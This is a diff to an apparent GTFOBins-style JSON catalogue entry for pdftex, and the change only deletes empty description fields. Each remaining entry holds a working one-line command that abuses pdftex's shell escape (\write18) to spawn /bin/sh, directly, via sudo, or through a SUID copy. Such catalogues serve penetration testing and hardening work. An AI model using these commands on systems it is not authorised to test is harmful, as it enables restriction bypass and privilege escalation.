@@ -2,19 +2,19 @@
   "functions": {
     "shell": [
       {
-        "description": "",
+        
         "code": "pdftex --shell-escape '\\write18{/bin/sh}\\end'\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "sudo pdftex --shell-escape '\\write18{/bin/sh}\\end'\n"
       }
     ],
     "limited-suid": [
       {
-        "description": "",
+        
         "code": "./pdftex --shell-escape '\\write18{/bin/sh}\\end'\n"
       }
     ]
